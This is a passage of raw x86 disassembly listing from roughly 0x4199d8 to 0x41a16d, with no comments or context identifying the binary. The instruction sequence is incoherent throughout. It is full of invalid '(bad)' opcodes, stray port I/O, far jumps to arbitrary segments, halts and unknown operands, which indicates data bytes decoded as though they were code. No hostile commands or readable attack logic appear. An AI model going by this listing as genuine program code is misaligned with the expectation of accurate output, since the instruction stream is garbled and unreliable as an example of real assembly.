  4199d8:	shl    BYTE PTR [eax-0x18],cl
  4199db:	dec    edx
  4199dc:	outs   dx,DWORD PTR ds:[esi]
  4199dd:	(bad)  
  4199de:	sbb    dh,dl
  4199e0:	stc    
  4199e1:	imul   edx,DWORD PTR [ecx],0xab0d2645
  4199e7:	dec    ebp
  4199e8:	mov    bh,0xe2
  4199ea:	xchg   edi,eax
  4199eb:	neg    DWORD PTR [eax]
  4199ed:	ss xor eax,0xf094a503
  4199f3:	movsx  esi,WORD PTR [ecx+0x7d]
  4199f7:	je     0x419a61
  4199f9:	push   esi
  4199fa:	xor    bl,BYTE PTR [ecx-0x5bbd4e6f]
  419a00:	pop    ebp
  419a01:	mov    cs,WORD PTR [edi-0x4f508d9c]
  419a07:	stos   BYTE PTR es:[edi],al
  419a08:	aas    
  419a09:	add    BYTE PTR [edi+0x3b20d336],al
  419a0f:	mov    eax,0x3a8d1fff
  419a14:	repz xlat BYTE PTR ds:[ebx]
  419a16:	das    
  419a17:	or     BYTE PTR [edi+edi*1],0xb0
  419a1b:	in     eax,dx
  419a1c:	and    al,0x40
  419a1e:	call   0x6b71:0xb866d44d
  419a25:	repz and eax,0x7e261f91
  419a2b:	fstp   DWORD PTR [ebx+eiz*4-0x72]
  419a2f:	loope  0x419a5f
  419a31:	xchg   ebx,eax
  419a32:	mov    cl,BYTE PTR [ebx+0x5b]
  419a35:	mov    dh,0x97
  419a37:	xchg   esi,eax
  419a38:	fxch   st(3)
  419a3a:	nop
  419a3b:	inc    edi
  419a3c:	push   ecx
  419a3d:	and    eax,0x895a7e2
  419a42:	mov    WORD PTR [edx],?
  419a44:	cld    
  419a45:	adc    eax,0xe1faa28c
  419a4a:	nop
  419a4b:	xor    al,0xb
  419a4d:	mov    al,0x33
  419a4f:	test   al,0x60
  419a51:	push   ss
  419a52:	xchg   ebx,eax
  419a53:	ret    
  419a54:	loope  0x419ac0
  419a56:	xor    BYTE PTR [eax],bh
  419a58:	dec    edi
  419a59:	sub    al,0x79
  419a5b:	push   ds
  419a5c:	scas   eax,DWORD PTR es:[edi]
  419a5d:	sub    eax,0xe9f0702c
  419a62:	xchg   esp,eax
  419a63:	mov    fs,WORD PTR [ebx]
  419a65:	cmp    esp,DWORD PTR [edx]
  419a67:	scas   eax,DWORD PTR es:[edi]
  419a68:	mov    ch,0xea
  419a6a:	and    al,0x6c
  419a6c:	push   ecx
  419a6d:	je     0x419a94
  419a6f:	pop    ebx
  419a70:	inc    edx
  419a71:	add    al,0xd6
  419a73:	mov    bh,0xf6
  419a75:	cmp    al,BYTE PTR [esp+ebx*1+0x71]
  419a79:	pop    es
  419a7a:	mov    dh,0x2f
  419a7c:	out    0x16,eax
  419a7e:	aam    0xd5
  419a80:	shl    BYTE PTR [ebx-0x27],cl
  419a83:	dec    edx
  419a84:	bound  ebx,QWORD PTR [edx-0x71350aa6]
  419a8a:	shr    bh,cl
  419a8c:	daa    
  419a8d:	std    
  419a8e:	mov    ah,0x40
  419a90:	push   ebp
  419a91:	fldenv [esi]
  419a93:	hlt    
  419a94:	ss push ss
  419a96:	pop    eax
  419a97:	ds in  al,dx
  419a99:	dec    ebp
  419a9a:	mul    DWORD PTR [edi+0x686a83cd]
  419aa0:	in     eax,dx
  419aa1:	xor    ecx,DWORD PTR [edx-0x500afa2d]
  419aa7:	cdq    
  419aa8:	mov    ah,0x1c
  419aaa:	fiadd  WORD PTR [esp+ebp*2]
  419aad:	dec    ebp
  419aae:	pop    edi
  419aaf:	fsubr  DWORD PTR [eax-0x516e6ba0]
  419ab5:	add    dl,BYTE PTR [ebx+ecx*4]
  419ab8:	mov    ah,0x5d
  419aba:	mov    dl,0x77
  419abc:	or     esi,DWORD PTR [edx+ebp*4]
  419abf:	mov    ebp,0xc7515dff
  419ac4:	sahf   
  419ac5:	aas    
  419ac6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ac7:	dec    edx
  419ac8:	mov    bh,0x20
  419aca:	sub    eax,0x8d6a79cd
  419acf:	imul   edx,DWORD PTR [ebx],0x23
  419ad2:	mov    WORD PTR [ecx],fs
  419ad4:	pop    ecx
  419ad5:	jle    0x419a93
  419ad7:	test   BYTE PTR [ebx],bh
  419ad9:	dec    ecx
  419ada:	and    eax,0xdce6616a
  419adf:	dec    esp
  419ae0:	dec    esp
  419ae1:	sub    al,0x88
  419ae3:	aad    0x77
  419ae5:	sbb    ebx,DWORD PTR [eax-0x3c]
  419ae8:	jne    0x419afb
  419aea:	xchg   ecx,eax
  419aeb:	pop    esi
  419aec:	sti    
  419aed:	push   ebp
  419aee:	jae    0x419a84
  419af0:	mov    ch,0xc2
  419af2:	add    BYTE PTR ds:0x7d19a53b,cl
  419af9:	(bad)  
  419afb:	scas   al,BYTE PTR es:[edi]
  419afc:	dec    ebp
  419afd:	iret   
  419afe:	jo     0x419b39
  419b00:	pushf  
  419b01:	sbb    DWORD PTR ds:0x602db9b1,0xf260f2bf
  419b0b:	mov    ebp,0x3d8ac0ce
  419b10:	mov    ecx,DWORD PTR [ecx+0x2a514252]
  419b16:	mov    bl,0xfa
  419b18:	lods   al,BYTE PTR ds:[esi]
  419b19:	into   
  419b1a:	pop    esi
  419b1b:	mov    edi,?
  419b1d:	in     eax,0xb2
  419b1f:	inc    edi
  419b20:	cmp    esp,esp
  419b22:	lea    ecx,[edi]
  419b24:	sar    cl,1
  419b26:	push   cs
  419b27:	neg    DWORD PTR [esi-0x22]
  419b2a:	mov    bl,0x3f
  419b2c:	add    cl,ch
  419b2e:	adc    eax,0xddafb95c
  419b33:	add    al,0x33
  419b35:	jmp    0x3c32889e
  419b3a:	or     BYTE PTR [ecx],dl
  419b3c:	inc    ebx
  419b3d:	dec    edi
  419b3e:	ins    DWORD PTR es:[edi],dx
  419b3f:	jo     0x419b56
  419b41:	sub    al,0xb5
  419b43:	cmp    al,0x30
  419b45:	add    al,0x8d
  419b47:	cmc    
  419b48:	shl    al,0x5b
  419b4b:	cmp    al,0x46
  419b4d:	ss jno 0x419afe
  419b50:	or     eax,DWORD PTR [ecx+0x6bd4241a]
  419b56:	out    0xd9,eax
  419b58:	ret    
  419b59:	and    bl,dl
  419b5b:	sub    eax,0xa642460a
  419b60:	out    dx,al
  419b61:	fiadd  DWORD PTR [edi]
  419b63:	imul   ecx,DWORD PTR [ebx+0x5d4fbf8d],0x498970df
  419b6d:	test   BYTE PTR [ebx+0x4f],dl
  419b70:	push   cs
  419b71:	(bad)  [edi+0x46]
  419b74:	ret    
  419b75:	cmc    
  419b76:	mov    DWORD PTR [ebx],ecx
  419b78:	lea    esi,[edi-0x49]
  419b7b:	shl    BYTE PTR es:[edx+0x6539b1fe],0x41
  419b83:	(bad)  
  419b84:	add    DWORD PTR [ebp-0x31323545],eax
  419b8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b8b:	pop    esp
  419b8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b8d:	in     eax,0x31
  419b8f:	add    ah,bh
  419b91:	les    esp,FWORD PTR [ebp+edx*4-0x76]
  419b95:	sub    esp,eax
  419b97:	mov    ds,WORD PTR [eax-0x39]
  419b9a:	out    dx,al
  419b9b:	xchg   BYTE PTR [eax-0x4a],al
  419b9e:	inc    edi
  419b9f:	leave  
  419ba0:	mov    edi,0x2a998034
  419ba5:	sti    
  419ba6:	jno    0x419c1d
  419ba8:	int    0x7a
  419baa:	out    0x9b,al
  419bac:	adc    BYTE PTR [esi+0x1f3a9bd7],bl
  419bb2:	ja     0x419b8b
  419bb4:	push   esi
  419bb5:	jns    0x419bbf
  419bb7:	out    0xc4,eax
  419bb9:	leave  
  419bba:	jp     0x419bd3
  419bbc:	dec    ch
  419bbe:	jo     0x419c38
  419bc0:	movups XMMWORD PTR [ebp-0xdb92b75],xmm5
  419bc7:	test   BYTE PTR ds:0xb23daca2,al
  419bcd:	jbe    0x419b61
  419bcf:	xor    eax,0x4d0da308
  419bd4:	jbe    0x419bb0
  419bd6:	int    0xad
  419bd8:	mov    edi,0x2cd70116
  419bdd:	out    dx,al
  419bde:	out    dx,eax
  419bdf:	push   eax
  419be0:	pusha  
  419be1:	stc    
  419be2:	pop    ss
  419be3:	xlat   BYTE PTR ds:[ebx]
  419be4:	cmp    DWORD PTR [edi-0x32],esi
  419be7:	push   es
  419be8:	in     eax,dx
  419be9:	(bad)  
  419bea:	mov    al,0x89
  419bec:	ds (bad) 
  419bee:	jne    0x419c29
  419bf0:	(bad)  
  419bf1:	out    0x8d,eax
  419bf3:	frstor [ecx+0x37]
  419bf6:	xlat   BYTE PTR ds:[ebx]
  419bf7:	aas    
  419bf8:	or     ch,BYTE PTR ds:0xbbb97b8a
  419bfe:	sbb    esp,edx
  419c00:	out    0xe,al
  419c02:	sub    BYTE PTR [eax],0x3c
  419c05:	fdiv   DWORD PTR [esi+esi*1-0x5914486f]
  419c0c:	stc    
  419c0d:	lahf   
  419c0e:	adc    al,cl
  419c10:	jno    0x419c74
  419c12:	hlt    
  419c13:	or     al,0xe7
  419c15:	addr16 push eax
  419c17:	ficom  WORD PTR [esi+0x2b]
  419c1a:	pop    ebp
  419c1b:	jecxz  0x419bef
  419c1d:	iret   
  419c1e:	dec    esp
  419c1f:	pop    ecx
  419c20:	rcl    DWORD PTR [edx+ebx*8-0x65956ca5],0x52
  419c28:	rol    dl,1
  419c2a:	mov    edi,0x2913def6
  419c2f:	(bad)  
  419c30:	adc    eax,0x735defbf
  419c35:	adc    al,BYTE PTR ds:0xdb3201aa
  419c3b:	add    al,BYTE PTR [esi+0x5f]
  419c3e:	fnstenv [eax+edx*8]
  419c41:	cdq    
  419c42:	push   ebx
  419c43:	ins    BYTE PTR es:[edi],dx
  419c44:	sub    dl,BYTE PTR [eax+0x33c34ad8]
  419c4a:	stos   DWORD PTR es:[edi],eax
  419c4b:	xor    eax,0x851e7832
  419c50:	(bad)  
  419c51:	stc    
  419c52:	or     edx,DWORD PTR [edx-0x4e14becb]
  419c58:	dec    ecx
  419c59:	dec    edi
  419c5a:	ins    BYTE PTR es:[edi],dx
  419c5b:	jp     0x419c14
  419c5d:	dec    esp
  419c5e:	mov    bl,0x6d
  419c60:	in     eax,0xfe
  419c62:	imul   edi,esp,0x71df7e6f
  419c68:	dec    ebp
  419c69:	mov    esp,0x64a5616
  419c6e:	pusha  
  419c6f:	or     DWORD PTR [ebp+ebx*1+0x5e8229ee],ebx
  419c76:	inc    esi
  419c77:	or     esp,DWORD PTR [ebx-0x6fab7099]
  419c7d:	dec    eax
  419c7e:	jo     0x419c70
  419c80:	jb     0x419c8c
  419c82:	xor    al,0x18
  419c84:	and    eax,0x26a0ebee
  419c89:	aaa    
  419c8a:	lea    eax,[eax+0x34]
  419c8d:	jns    0x419d02
  419c8f:	shl    ah,cl
  419c91:	add    eax,0x1e856efa
  419c96:	xor    BYTE PTR [eax+0x34],0x9d
  419c9a:	mov    bl,0x7a
  419c9c:	xchg   edi,eax
  419c9d:	or     eax,eax
  419c9f:	push   ebp
  419ca0:	retf   
  419ca1:	icebp  
  419ca2:	inc    ebp
  419ca3:	sahf   
  419ca4:	outs   dx,BYTE PTR ds:[esi]
  419ca5:	ret    
  419ca6:	cli    
  419ca7:	inc    edi
  419ca8:	mov    ebp,0xaec164fb
  419cad:	adc    eax,0xbce48aab
  419cb2:	bt     DWORD PTR [ecx+0x72],ebx
  419cb6:	ds push esp
  419cb8:	lock (bad) 
  419cba:	mov    edx,0x945e4a1b
  419cbf:	jl     0x419cd3
  419cc1:	imul   edi,DWORD PTR [eax],0x200a37aa
  419cc7:	lahf   
  419cc8:	adc    eax,0xc2e1d35f
  419ccd:	dec    edi
  419cce:	or     bl,ah
  419cd0:	push   esp
  419cd1:	dec    ecx
  419cd2:	mov    ecx,DWORD PTR [ebp-0x12]
  419cd5:	adc    ecx,DWORD PTR [eax+0x4a]
  419cd8:	mov    esi,0x66f42f3f
  419cdd:	sub    BYTE PTR [edx-0x19],dl
  419ce0:	push   ebp
  419ce1:	neg    BYTE PTR ds:0x67258d03
  419ce7:	pop    edi
  419ce8:	sbb    bh,dl
  419cea:	adc    bl,BYTE PTR [eax+0x28]
  419ced:	into   
  419cee:	mov    ch,0xcf
  419cf0:	int    0xa1
  419cf2:	xchg   ebp,eax
  419cf3:	cdq    
  419cf4:	adc    eax,0x78892ab
  419cf9:	scas   al,BYTE PTR es:[edi]
  419cfa:	pop    esp
  419cfb:	jbe    0x419d58
  419cfd:	pop    ds
  419cfe:	daa    
  419cff:	sub    ecx,DWORD PTR [ebp+0x2a]
  419d02:	sti    
  419d03:	cmp    al,0xd8
  419d05:	push   0xffffff8b
  419d07:	mov    al,ds:0xff3ac6f5
  419d0c:	in     eax,0x59
  419d0e:	jns    0x419d7a
  419d10:	fs enter 0xeb7,0xff
  419d15:	inc    edi
  419d16:	js     0x419d1f
  419d18:	mov    WORD PTR [ecx+eax*8+0x61affefb],fs
  419d1f:	add    eax,eax
  419d21:	cmp    eax,0x50f9dbc9
  419d26:	sbb    al,0x94
  419d28:	xchg   ebp,eax
  419d29:	add    DWORD PTR [eax],0xffffffa6
  419d2c:	jmp    0x9cb5:0x32af9feb
  419d33:	fwait
  419d34:	sbb    bl,BYTE PTR [ecx-0x17]
  419d37:	je     0x419d92
  419d39:	dec    edx
  419d3a:	es test eax,0x4f8f55b3
  419d40:	popa   
  419d41:	mov    edi,edi
  419d43:	repnz les ebp,FWORD PTR [esi]
  419d46:	(bad)  
  419d47:	xor    BYTE PTR [ebx-0x3],ch
  419d4a:	fnsave [edi]
  419d4c:	in     al,0xb6
  419d4e:	mov    ebp,0xa0ef114d
  419d53:	cmp    edi,DWORD PTR [edi+0x3f]
  419d56:	ret    0xb6c4
  419d59:	xchg   BYTE PTR [ebp+0x35],bh
  419d5c:	pop    esi
  419d5d:	mov    BYTE PTR [ecx],0xc
  419d60:	adc    DWORD PTR [esi+0x26],eax
  419d63:	mov    al,ds:0x151ba3a8
  419d68:	pop    ds
  419d69:	in     eax,0xa6
  419d6b:	mov    cl,0xe8
  419d6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d6e:	xor    esp,DWORD PTR [ebx+0x2f]
  419d71:	dec    edx
  419d72:	div    BYTE PTR [edi]
  419d74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d75:	sbb    BYTE PTR [esi],bl
  419d77:	out    dx,eax
  419d78:	mov    edi,0xbb4bd58a
  419d7d:	jno    0x419d31
  419d7f:	pop    eax
  419d80:	jmp    0x419db4
  419d82:	mov    eax,ds:0x537b30d5
  419d87:	mov    bh,0x92
  419d89:	mov    bl,0xe5
  419d8b:	pop    es
  419d8c:	and    eax,0x53fa07d1
  419d91:	xchg   BYTE PTR [esi-0x49],ah
  419d94:	sbb    eax,0x63e3e3a6
  419d99:	sbb    BYTE PTR [ebp-0x17],ch
  419d9c:	cs imul edx,esi,0x6bb51ee1
  419da3:	xor    eax,0x54ba42bb
  419da8:	test   eax,0xfcdb1c04
  419dad:	ret    0x453
  419db0:	mov    edx,0xbc799b33
  419db5:	arpl   WORD PTR [eax+0x49],sp
  419db8:	cmp    bl,cl
  419dba:	jb     0x419d78
  419dbc:	data16 (bad) 
  419dbe:	fmul   QWORD PTR [edi+edx*1]
  419dc1:	cli    
  419dc2:	retf   
  419dc3:	push   edi
  419dc4:	xor    ah,BYTE PTR [eax-0x10]
  419dc7:	adc    al,0xa7
  419dc9:	repnz fcomp QWORD PTR [ebp+0x1a]
  419dcd:	retf   0xa617
  419dd0:	fld    DWORD PTR cs:[esi]
  419dd3:	bound  eax,QWORD PTR [ecx+0x730845e]
  419dd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dda:	in     al,0xa3
  419ddc:	or     bh,BYTE PTR [edi+0x7a54b564]
  419de2:	loopne 0x419e00
  419de4:	daa    
  419de5:	fsubrp st(4),st
  419de7:	xor    eax,0x39f11fd8
  419dec:	js     0x419e5b
  419dee:	pop    edi
  419def:	sti    
  419df0:	enter  0xba14,0x5b
  419df4:	mov    bh,0xb8
  419df6:	(bad)  
  419df7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419df8:	(bad)  
  419df9:	in     al,0x48
  419dfb:	in     eax,dx
  419dfc:	cld    
  419dfd:	sbb    eax,0x7be5e807
  419e02:	push   esi
  419e03:	das    
  419e04:	clc    
  419e05:	(bad)  
  419e06:	data16 xlat BYTE PTR ds:[ebx]
  419e08:	mov    DWORD PTR [edi+edi*1+0x1993417f],esp
  419e0f:	lea    ebx,[ebp-0x5d]
  419e12:	icebp  
  419e13:	leave  
  419e14:	inc    ecx
  419e15:	ret    0xa992
  419e18:	clc    
  419e19:	xchg   BYTE PTR [esi],cl
  419e1b:	push   ds
  419e1c:	or     esi,ebx
  419e1e:	lea    esp,[ecx+0x29]
  419e21:	pusha  
  419e22:	hlt    
  419e23:	repz push ecx
  419e25:	push   eax
  419e26:	cmp    ebp,DWORD PTR [edx+0x48]
  419e29:	arpl   WORD PTR [edx],cx
  419e2b:	and    DWORD PTR [esi-0x29],0xf7477ed0
  419e32:	inc    ecx
  419e33:	fst    DWORD PTR [ecx+0x6e7fde3d]
  419e39:	fdiv   QWORD PTR [ecx+0x2f485cd2]
  419e3f:	pop    es
  419e40:	and    eax,0xec3bb1d
  419e45:	das    
  419e46:	push   ds
  419e47:	sbb    BYTE PTR [ecx+0x38],bh
  419e4a:	outs   dx,BYTE PTR ds:[esi]
  419e4b:	fst    QWORD PTR [esi-0x60]
  419e4e:	lods   al,BYTE PTR ds:[esi]
  419e4f:	pavgw  mm3,QWORD PTR [ebp+0x7e072579]
  419e56:	push   edi
  419e57:	pop    ecx
  419e58:	cmp    esp,edx
  419e5a:	jmp    0x94ce:0x3142b766
  419e61:	test   eax,0xf2505d78
  419e66:	adc    al,0x3b
  419e68:	or     bl,BYTE PTR [edx]
  419e6a:	and    BYTE PTR [edi],dl
  419e6c:	pop    ebx
  419e6d:	fadd   QWORD PTR [edx]
  419e6f:	dec    BYTE PTR [esi+0x29]
  419e72:	fisub  DWORD PTR [esi]
  419e74:	hlt    
  419e75:	pop    edx
  419e76:	test   BYTE PTR [ecx+0xb4ba3aa],ch
  419e7c:	push   esi
  419e7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e7e:	jl     0x419efc
  419e80:	data16 mov ds:0x1516abdc,al
  419e86:	jp     0x419e11
  419e88:	cmp    ah,BYTE PTR [ecx-0x21]
  419e8b:	lods   al,BYTE PTR ds:[esi]
  419e8c:	lods   al,BYTE PTR ds:[esi]
  419e8d:	jp     0x419e30
  419e8f:	push   0xffffffe4
  419e91:	cmp    ch,dl
  419e93:	in     al,0x88
  419e95:	pop    edx
  419e96:	xchg   DWORD PTR [ebx],ebp
  419e98:	in     al,0xd9
  419e9a:	out    0x20,eax
  419e9c:	xlat   BYTE PTR ds:[ebx]
  419e9d:	push   esp
  419e9e:	retf   0x5abd
  419ea1:	lea    eax,[ebp+0x66b1f11b]
  419ea7:	sbb    al,0x75
  419ea9:	sbb    esp,esp
  419eab:	shl    ebp,1
  419ead:	adc    eax,0xd6d37b87
  419eb2:	in     eax,dx
  419eb3:	cmc    
  419eb4:	test   BYTE PTR [esp+eiz*2+0x31],bh
  419eb8:	int    0xd3
  419eba:	sar    DWORD PTR [ebx-0x5c818b0a],1
  419ec0:	xor    DWORD PTR [esi+0x9883524],ebp
  419ec6:	mov    esi,0x94a13758
  419ecb:	scas   al,BYTE PTR es:[edi]
  419ecc:	mov    ds:0xa047af41,eax
  419ed1:	mov    ds:0x11ba38ec,eax
  419ed6:	sahf   
  419ed7:	mov    ebx,esi
  419ed9:	mov    dl,0xa8
  419edb:	or     al,BYTE PTR [ebp+0x48b0aef8]
  419ee1:	add    al,0x2a
  419ee3:	pop    ebp
  419ee4:	and    eax,0x811cbc34
  419ee9:	mov    ah,0xc7
  419eeb:	(bad)  
  419eec:	pop    ecx
  419eed:	mov    cl,bl
  419eef:	jnp    0x419eac
  419ef1:	ss push ecx
  419ef3:	push   edx
  419ef4:	xchg   esi,eax
  419ef5:	and    al,0x44
  419ef7:	jecxz  0x419f34
  419ef9:	mov    fs,WORD PTR [esi+0x29]
  419efc:	pop    esp
  419efd:	and    DWORD PTR [ebp-0xa],esi
  419f00:	pushf  
  419f01:	icebp  
  419f02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f03:	aaa    
  419f04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f05:	and    bh,BYTE PTR [esi-0x38]
  419f08:	xor    eax,0xf69d886e
  419f0d:	mov    bl,0x64
  419f0f:	cmp    esi,edx
  419f11:	xchg   esp,eax
  419f12:	imul   ecx,DWORD PTR [ebx+ecx*2+0x58],0xffffff93
  419f17:	mov    edx,0x5183dec
  419f1c:	adc    dh,BYTE PTR [ebp+0x14279403]
  419f22:	lock leave 
  419f24:	xlat   BYTE PTR ds:[ebx]
  419f25:	fld    DWORD PTR [eax]
  419f27:	icebp  
  419f28:	repz and eax,0x5ee8067e
  419f2e:	pop    ebp
  419f2f:	and    DWORD PTR [ebx],edx
  419f31:	dec    edi
  419f32:	pop    esi
  419f33:	scas   eax,DWORD PTR es:[edi]
  419f34:	test   ecx,eax
  419f36:	in     eax,0xe6
  419f38:	mov    esi,0xf48e8f78
  419f3d:	jae    0x419f5e
  419f3f:	lea    ebp,[edx+0x2a4c432a]
  419f45:	sti    
  419f46:	outs   dx,BYTE PTR ds:[esi]
  419f47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f48:	rcl    esi,0xa0
  419f4b:	imul   ebx,DWORD PTR [eax-0x21],0x2dc2ca5c
  419f52:	mov    ds:0x1f046471,al
  419f57:	scas   eax,DWORD PTR es:[edi]
  419f58:	(bad)  
  419f59:	in     eax,0x42
  419f5b:	dec    ebx
  419f5c:	mov    ebx,0x915be1f1
  419f61:	fisubr WORD PTR ds:0x87748f8e
  419f67:	xchg   edx,eax
  419f68:	cmc    
  419f69:	push   0x7d
  419f6b:	sub    BYTE PTR [eax+0x30],bh
  419f6e:	jnp    0x419f0a
  419f70:	and    DWORD PTR [eax-0x5f960087],0x96b2b15d
  419f7a:	loopne 0x419f1e
  419f7c:	or     esp,edx
  419f7e:	sub    eax,0x5c15c212
  419f83:	jne    0x419fc4
  419f85:	mov    esp,0x452cf05
  419f8a:	push   0xffffffa3
  419f8c:	xor    al,0x7e
  419f8e:	ds loopne 0x419fc9
  419f91:	pop    es
  419f92:	loopne 0x419ff6
  419f94:	jecxz  0x419ff7
  419f96:	mov    ds:0x45e03eb8,eax
  419f9b:	add    eax,0x1da85341
  419fa0:	call   0xebee3f6b
  419fa5:	fild   QWORD PTR [edx-0x5b57c316]
  419fab:	shr    eax,cl
  419fad:	sbb    edi,ebp
  419faf:	cdq    
  419fb0:	jle    0x41a014
  419fb2:	daa    
  419fb3:	cli    
  419fb4:	push   0xa88a32b6
  419fb9:	not    BYTE PTR [ebp+0x21652ede]
  419fbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fc0:	mov    WORD PTR [eax],ds
  419fc2:	push   ds
  419fc3:	inc    ebp
  419fc4:	or     al,0x9b
  419fc6:	or     ch,BYTE PTR [edi+0x50]
  419fc9:	cmp    eax,0xef2360ee
  419fce:	mov    cl,0x46
  419fd0:	and    BYTE PTR [esi],0xea
  419fd3:	pop    es
  419fd4:	jle    0x41a03f
  419fd6:	into   
  419fd7:	add    eax,0x10f88880
  419fdc:	cmp    ebx,DWORD PTR [ebx]
  419fde:	les    esi,FWORD PTR [edi+edx*2]
  419fe1:	lahf   
  419fe2:	xchg   edi,eax
  419fe3:	and    al,0xfa
  419fe5:	lea    edi,[esp+eax*4-0x40171d9]
  419fec:	add    al,dl
  419fee:	or     al,0x26
  419ff0:	sbb    ah,bl
  419ff2:	inc    eax
  419ff3:	xchg   ecx,eax
  419ff4:	xor    eax,0x913ecbd3
  419ff9:	or     ebp,DWORD PTR [eax+0x4519e031]
  419fff:	jb     0x419fed
  41a001:	sahf   
  41a002:	inc    ebx
  41a003:	adc    dl,dl
  41a005:	not    dl
  41a007:	aas    
  41a008:	es mov cl,0x33
  41a00b:	sub    DWORD PTR [eax],edi
  41a00d:	dec    edx
  41a00e:	or     bl,BYTE PTR [ebx-0x6f8270b]
  41a014:	pop    ebx
  41a015:	out    dx,al
  41a016:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41a018:	stos   DWORD PTR es:[edi],eax
  41a019:	and    ecx,esi
  41a01b:	mov    eax,0x355347c6
  41a020:	and    esi,DWORD PTR [eax-0x50393e5d]
  41a026:	mov    bl,BYTE PTR ds:0x74d8860d
  41a02c:	call   0x4e94:0xa432084b
  41a033:	jne    0x41a05d
  41a035:	adc    ecx,0xffffffcf
  41a038:	inc    ebp
  41a039:	xchg   edi,eax
  41a03a:	js     0x41a063
  41a03c:	pop    ebp
  41a03d:	outs   dx,BYTE PTR ds:[esi]
  41a03e:	hlt    
  41a03f:	jo     0x41a03b
  41a041:	bound  eax,QWORD PTR [ebp+0x22]
  41a044:	lods   al,BYTE PTR ds:[esi]
  41a045:	or     al,0xc3
  41a047:	inc    esi
  41a048:	stc    
  41a049:	dec    eax
  41a04a:	pop    ebp
  41a04b:	mov    ds:0xe17d3450,al
  41a050:	jo     0x419fda
  41a052:	xor    al,0xc4
  41a054:	xchg   esi,eax
  41a055:	pop    edx
  41a056:	lock out dx,al
  41a058:	mov    cl,BYTE PTR [edi]
  41a05a:	xlat   BYTE PTR ds:[ebx]
  41a05b:	xchg   ebp,eax
  41a05c:	(bad)  
  41a05e:	mov    BYTE PTR [esi+0xf851c3d],bl
  41a064:	stc    
  41a065:	aaa    
  41a066:	and    dl,BYTE PTR [edi]
  41a068:	aaa    
  41a069:	loopne 0x41a0af
  41a06b:	js     0x41a087
  41a06d:	scas   eax,DWORD PTR es:[edi]
  41a06e:	cmp    bl,BYTE PTR ss:[eax]
  41a071:	adc    esi,esp
  41a073:	mov    dh,0x72
  41a075:	sbb    ah,dl
  41a077:	xor    DWORD PTR [esp+edi*2+0x20],ecx
  41a07b:	and    eax,0x3af0e5c3
  41a080:	or     eax,0xeea6a132
  41a085:	xchg   esi,eax
  41a086:	push   cs
  41a087:	adc    eax,0x4b43eafb
  41a08c:	lods   al,BYTE PTR ds:[esi]
  41a08d:	es stos BYTE PTR es:[edi],al
  41a08f:	(bad)  
  41a090:	adc    cl,bl
  41a092:	push   ebp
  41a093:	jp     0x41a0cb
  41a095:	js     0x41a024
  41a097:	les    edx,FWORD PTR [eax+0x70]
  41a09a:	xchg   edx,eax
  41a09b:	push   ecx
  41a09c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a09d:	sahf   
  41a09e:	mov    ebp,ebx
  41a0a0:	pop    eax
  41a0a1:	(bad)  
  41a0a2:	adc    DWORD PTR [ebp+0x7f],ecx
  41a0a5:	jns    0x41a0a4
  41a0a7:	leave  
  41a0a8:	push   0x7d
  41a0aa:	xor    eax,DWORD PTR [ebp-0x8fe67f7]
  41a0b0:	gs imul edx,edi,0x86cbd77a
  41a0b7:	pop    ds
  41a0b8:	mov    ds:0x34283400,al
  41a0bd:	xor    DWORD PTR [esi+0x1b],0x7
  41a0c1:	jmp    0x2ec0de08
  41a0c6:	add    eax,0xdde63cb
  41a0cb:	mov    cl,0xe0
  41a0cd:	mov    ds:0xb58a9a02,eax
  41a0d2:	cmp    dh,ch
  41a0d4:	in     eax,0x45
  41a0d6:	inc    eax
  41a0d7:	xchg   edi,eax
  41a0d8:	test   DWORD PTR [edi-0x5c],ecx
  41a0db:	int    0x54
  41a0dd:	test   ecx,0xf532b57c
  41a0e3:	and    eax,0xd448ee2e
  41a0e8:	inc    ebx
  41a0e9:	iret   
  41a0ea:	fwait
  41a0eb:	adc    BYTE PTR [edx],cl
  41a0ed:	out    0x92,al
  41a0ef:	push   esi
  41a0f0:	and    DWORD PTR [ebx],ebp
  41a0f2:	lock xor bl,BYTE PTR [edi-0x4b]
  41a0f6:	mov    BYTE PTR ds:0x1fc28a18,bh
  41a0fc:	inc    ebp
  41a0fd:	cmp    cl,bh
  41a0ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a100:	adc    eax,0x7c285f67
  41a105:	popa   
  41a106:	or     BYTE PTR [eax+0x7a],0x89
  41a10a:	push   0xffffffaa
  41a10c:	jmp    0x41a0cd
  41a10e:	push   cs
  41a10f:	test   eax,0x304ecceb
  41a114:	mov    WORD PTR [edi+0x4f72f9c5],es
  41a11a:	cmp    al,0xae
  41a11c:	mov    ?,edi
  41a11e:	rcl    ebx,1
  41a120:	inc    edx
  41a121:	dec    edi
  41a122:	dec    DWORD PTR [edx-0x2ca9278a]
  41a128:	call   0x6805:0x621ccdda
  41a12f:	imul   esp,eax,0x38
  41a132:	test   BYTE PTR [edi-0x6a],ch
  41a135:	and    eax,0x1c44fa20
  41a13a:	shl    BYTE PTR [ebp-0x3b32efe7],1
  41a140:	outs   dx,DWORD PTR ds:[esi]
  41a141:	sahf   
  41a142:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a143:	aam    0x45
  41a145:	rol    DWORD PTR [edx+0x55c51e60],0x87
  41a14c:	fimul  DWORD PTR [edi-0x75f6b481]
  41a152:	or     eax,0x4ab5f3d
  41a157:	add    DWORD PTR ds:0x59f69b61,edi
  41a15d:	mov    al,ds:0x9f2d6252
  41a162:	sub    eax,0xde41766f
  41a167:	pop    ecx
  41a168:	sub    al,BYTE PTR [ebp+0x37]
  41a16b:	pusha  
  41a16c:	push   eax
  41a16d:	mov    dh,BYTE PTR ds:0xd2315b35
